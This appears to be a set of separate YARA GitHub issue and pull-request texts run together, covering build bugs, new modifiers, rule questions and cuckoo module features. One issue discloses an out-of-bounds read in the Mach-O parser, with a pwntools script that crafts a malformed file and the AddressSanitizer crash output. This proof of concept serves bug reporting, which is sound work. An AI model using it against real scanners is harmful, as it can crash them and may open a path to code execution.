Hi,

when scanning a file with libyara 3.11.0 on AIX 7.2 PPC64 POWER7 I sporadically get one of the following two assertion failures:

```
Assertion failed: __EX, file  exec.c, line 1331
```

or 

```
Assertion failed: __EX, file  object.c, line 410
```

The assertions can be found here:
https://github.com/VirusTotal/yara/blob/v3.11.0/libyara/exec.c#L1331
https://github.com/VirusTotal/yara/blob/v3.11.0/libyara/object.c#L410

It seems like it's completely random. I would say the first failure is raised every 30th time, the second error every 5th time.

I can't even say which rule triggers that assertion failure. The same ruleset is working fine on Windows, Linux and macOS.

Anyone here who knows what causes the above assertions to fail? 

Libyara was compiled with:

```
CFLAGS="-maix64" OBJECT_MODE=64 ./configure --disable-shared --disable-magic --disable-cuckoo --enable-dotnet
```

OpenSSL Version `1.0.2r`

ulimits:
```
core file size          (blocks, -c) unlimited
data seg size           (kbytes, -d) unlimited
file size               (blocks, -f) unlimited
max memory size         (kbytes, -m) unlimited
open files                      (-n) unlimited
pipe size            (512 bytes, -p) 64
stack size              (kbytes, -s) unlimited
cpu time               (seconds, -t) unlimited
max user processes              (-u) unlimited
virtual memory          (kbytes, -v) unlimited
```

Available memory: `svmon -G -O unit=MB`
```
Unit: MB
--------------------------------------------------------------------------------------
               size       inuse        free         pin     virtual  available  mmode
memory      7648,00     1876,96     5771,04     1571,56     1641,38    5756,04     Ded
pg space     512,00        8,19

               work        pers        clnt       other
pin         1062,41           0        16,3      492,81
in use      1641,38           0      235,59
```

Kind regards,

Marcel

Add two new modifiers: base64 and widebase64.

These modifiers take the given text string and generate 3 different strings
being careful to trim off the bytes which are dependent upon leading or
trailing bytes in the larger search space.

I've implemented it by slightly cheating. I generate all the search strings in
a list and then creating one large string suitable for the RE compiler to deal
with. For example, the string "This program cannot" generates these three
base64 encoded strings:

VGhpcyBwcm9ncmFtIGNhbm5vd
RoaXMgcHJvZ3JhbSBjYW5ub3
UaGlzIHByb2dyYW0gY2Fubm90

Those three strings are then transformed into a RE that looks like this:

(VGhpcyBwcm9ncmFtIGNhbm5vd|RoaXMgcHJvZ3JhbSBjYW5ub3|UaGlzIHByb2dyYW0gY2Fubm90)

That string is then passed to the RE compiler for parsing and AST generation.
The AST is then emitted into the appropriate spot and YARA believes it was
given a regex from that point on.

I've also implemented support for specifying custom alphabets:

base64("!@#$%^&*(){}[].,|ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstu")

This means that I have to be careful to escape any special RE characters in the
string passed to the compiler. The base64 alphabet has to be 64 bytes long, and
does support escaped bytes properly too.

To avoid the need to deal with escaping I had a first implementation which
attempted to generate the AST by hand, which was mostly working but was very
cumbersome to maintain. In doing this I ended up improving yr_re_print_node()
so that it indents the tree properly, which made debugging that attempt easier.
My apologies for including it in this diff. I can split it out if you want.

Lastly, I did most of the work in re.c but I think it belongs in it's own
base64.c. I'm happy to move it out of re.c if you would prefer.
upx 3.94
UCL data compression library 1.03
zlib data compression library 1.2.11
LZMA SDK version 4.43

repro:
on x64 ubuntu 18.04 machine
1. $ apt-get install upx
2. $ upx -o f /usr/bin/someELF
3. $ file f
    ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), statically linked, stripped
4. $ yara rule.yar f

$ cat rule.yar
rule upx_test
{
        meta:
                tool = "P"
                name = "UPX"
                version = "3.9x [LZMA]"
                source = "nv"
                pattern = "E8????????555351524801FE"
        strings:
                $1 = { E8 ?? ?? ?? ?? 55 53 51 52 48 01 FE }
        condition:
                $1 at elf.entry_point
}
I noticed there were some issues about Yara bindings for different languages, so decided to leave the announcement of [OCaml](https://ocaml.org/) ones:
- https://opam.ocaml.org/packages/yara/
- https://github.com/XVilka/yara-ocaml

They are very basic (just to fulfill my own needs), but I am open for suggestions, and pull requests.
Hello,

I was recently looking at the following file:

67757D0A55960716CF713557256BB21086774B513941FE9586EFC7139D42A336

This is a file with 1 signature and no version information. Here's some snipped output from the -D flag with yara:

```
signatures
		[0]
			thumbprint = "564e01066387f26c912010d06bd78d3cf1e845ab"
			issuer = "/C=US/ST=Washington/L=Redmond/O=Microsoft Corporation/OU=Copyright (c) 2000 Microsoft Corp./CN=Microsoft Code Signing PCA"
			subject = "/C=US/ST=Washington/L=Redmond/O=Microsoft Corporation/CN=Microsoft Corporation"
			version = 3
			algorithm = "sha1WithRSAEncryption"
			serial = "61:46:9e:cb:00:04:00:00:00:65"
			not_before = 1144179826
			not_after = 1191527626
[...snipped]
version_info
[...snipped (there is no version info, which is correct)
```

When I try to match on this using a rule like this, no match is provided - presumably because it cant find any version information:

```
import "pe" 
rule general_win_appended_microsoft_certificate
{
    condition:
        pe.signatures[0].subject contains "L=Redmond/O=Microsoft Corporation" and
        not pe.version_info["LegalCopyright"] contains "Microsoft"
}
```

I think in cases like this the signature should fire, thoughts?

Cheers,
Tom

In [libyara/modules/macho/macho.c](https://github.com/VirusTotal/yara/blob/master/libyara/modules/macho/macho.c), yara doesn't check whether the variable [command_size](https://github.com/VirusTotal/yara/blob/master/libyara/modules/macho/macho.c#L370) is consistent with the command's real size. A crafted MachO file will lead an out-of-bounds memory access later. 

Following is the bug code.

```c
  uint8_t *command = (uint8_t*)(header + 1);                                   \
  for (unsigned i = 0; i < yr_##bo##32toh(header->ncmds); i++)                 \
  {                                                                            \
    yr_load_command_t* command_struct = (yr_load_command_t*)command;           \
    uint64_t command_size = yr_##bo##32toh(command_struct->cmdsize);           \
                                                                               \
    if (size < parsed_size + command_size)                                     \
      break;                                                                   \
                                                                               \
    switch(yr_##bo##32toh(command_struct->cmd))                                \
    {                                                                          \
      case LC_SEGMENT:                                                         \
      case LC_SEGMENT_64:                                                      \
      {                                                                        \
        macho_handle_segment_##bits##_##bo(command, seg_count++, object);      \
        break;                                                                 \
      }                                                                        \
      case LC_UNIXTHREAD:                                                      \
      {                                                                        \
        macho_handle_unixthread_##bo(command, object, context);                \
        break;                                                                 \
      }                                                                        \
      case LC_MAIN:                                                            \
      {                                                                        \
        macho_handle_main_##bo(command, object, context);                      \
        break;                                                                 \
      }                                                                        \
    }  
``` 

Take an example. If the size is 0x4000, `ncmds == 2`, and there is only one command whose size is `0x4000-28`. The memory layout of the crafted macho would look like:

```
[HEADER 28 bytes][FIRST COMMAND 0x4000-28 bytes]
```

Thus, when yara tries to handle the second command [here](https://github.com/VirusTotal/yara/blob/master/libyara/modules/macho/macho.c#L370),  yara will access the address after [data](https://github.com/VirusTotal/yara/blob/master/libyara/modules/macho/macho.c#L341), causing an out-of-bounds memory access. This will cause crash or potentials code executions. 

The poc is attach:

```bash
$ cat poc.r
import "macho"

$ pip install pwntools

$ cat get_macho.py
from pwn import *

my_p8 = p8
my_p16 = p16
my_p32 = p32

def get_header():
    header = my_p32(0xfeedface)
    header += my_p32(0) * 3
    header += my_p32(2)
    header += my_p32(0) * 2

    return header

def get_cmd1():
    cmd_size = 0x4000 - 28
    cmd = my_p32(0xdeadbeef)
    cmd += my_p32(cmd_size)
    cmd = cmd.ljust(cmd_size, '\x00')
    return cmd

if __name__ == "__main__":
    macho = get_header()
    macho += get_cmd1()


    f = file("my_macho", "wb")
    f.write(macho)
    f.close()

$ python get_macho.py

$ ./yara poc.r my_macho
=================================================================
==31861==ERROR: AddressSanitizer: unknown-crash on address 0x7f15a4ff6004 at pc 0x7f15a3b6c7b3 bp 0x7ffd89ba7310 sp 0x7ffd89ba7300
READ of size 4 at 0x7f15a4ff6004 thread T0
    #0 0x7f15a3b6c7b2 in macho_parse_file_32_le.part.0 (/homes/xxx/Github/yara/libyara/.libs/libyara.so.3+0x5a7b2)
    #1 0x7f15a3b7621d in macho__load (/homes/xxx/Github/yara/libyara/.libs/libyara.so.3+0x6421d)
    #2 0x7f15a3bc847e in yr_modules_load (/homes/xxx/Github/yara/libyara/.libs/libyara.so.3+0xb647e)
    #3 0x7f15a3ba1ece in yr_execute_code (/homes/xxx/Github/yara/libyara/.libs/libyara.so.3+0x8fece)
    #4 0x7f15a3bf50ff in yr_scanner_scan_mem_blocks (/homes/xxx/Github/yara/libyara/.libs/libyara.so.3+0xe30ff)
    #5 0x7f15a3bf5e7c in yr_scanner_scan_mem (/homes/xxx/Github/yara/libyara/.libs/libyara.so.3+0xe3e7c)
    #6 0x7f15a3bf6027 in yr_scanner_scan_file (/homes/xxx/Github/yara/libyara/.libs/libyara.so.3+0xe4027)
    #7 0x5629e567293e in main (/homes/u28/xxx/Github/yara/.libs/yara+0x793e)
    #8 0x7f15a3523b96 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21b96)
    #9 0x5629e5673319 in _start (/homes/u28/xxx/Github/yara/.libs/yara+0x8319)

Address 0x7f15a4ff6004 is a wild pointer.
SUMMARY: AddressSanitizer: unknown-crash (/homes/xxx/Github/yara/libyara/.libs/libyara.so.3+0x5a7b2) in macho_parse_file_32_le.part.0
Shadow bytes around the buggy address:
  0x0fe3349f6bb0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0fe3349f6bc0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0fe3349f6bd0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0fe3349f6be0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0fe3349f6bf0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x0fe3349f6c00:[fe]fe fe fe fe fe fe fe fe fe fe fe fe fe fe fe
  0x0fe3349f6c10: fe fe fe fe fe fe fe fe fe fe fe fe fe fe fe fe
  0x0fe3349f6c20: fe fe fe fe fe fe fe fe fe fe fe fe fe fe fe fe
  0x0fe3349f6c30: fe fe fe fe fe fe fe fe fe fe fe fe fe fe fe fe
  0x0fe3349f6c40: fe fe fe fe fe fe fe fe fe fe fe fe fe fe fe fe
  0x0fe3349f6c50: fe fe fe fe fe fe fe fe fe fe fe fe fe fe fe fe
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==31861==ABORTING
```

Crafted MachO [my_macho](https://github.com/VirusTotal/yara/files/3936000/my_macho.zip) is also attached.

See #1175. Added support for:
- network.host(regexp)
    -  example: cuckoo.network.host(/192.168.1.1/)
- network.tcp(regexp, int)
    - aguments: (destintion_ip, destination_port)
    - example: cuckoo.network.tcp(/192.168.1.1:80/)
- network.udp(regexp, int)
    - aguments: (destintion_ip, destination_port)
    - example: cuckoo.network.tcp(/192.168.1.1:53/)
- network.http_user_agent(regexp)
    - example: cuckoo.network.http_user_agent(/MSIE 6\.0/)

I tested with a JSON cuckoo report I grabbed from a VT CuckooFork run. I looked into creating/running tests, but as there are not any tests for the cuckoo module I decided it was out of scope of this PR to implement that. Happy to help with future work though. 

I think that the whole module could probably use a refactor, but I designed my additions around the existing code set. There is definitely some code-reuse and repetition.
See TL;DR

As an avid VT user, I was excited to learn about support for hunting with yara, including support for the cuckoo module. When I started to use the module, I noticed that it did not yet support many of the things that are available in many cuckoo JSON reports.

When looking through issues and PRs, I found #958 which wanted to update the module to support the latest cuckoo JSON format. Unfortunately it looks like this had some issues that were never fixed and it was not merged.

While updating the module to support the latest JSON as well as keeping it backwards compatible seems worthwhile, my request is to simply support 3 new functions to parse existing functionality from the cuckoo reports:

network.host(regexp)
	example: cuckoo.network.host(/192\.168\.1\.1/)
network.tcp(regexp)
	example: cuckoo.network.tcp(/192\.168\.1\.1:80/)
network.udp(regexp)
	example: cuckoo.network.tcp(/192\.168\.1\.1:53/)

I have read the source and think I can add these methods via a PR. I am also happy to write the documentation to support these methods. 

As far as I can tell there is no need to support new versions of cuckoo reports, but if there is interest then I could add support for those as well.

TL;DR before I start work on a PR, are the maintainers interested in seeing support for additional network methods in the cuckoo module?
Fixes #1168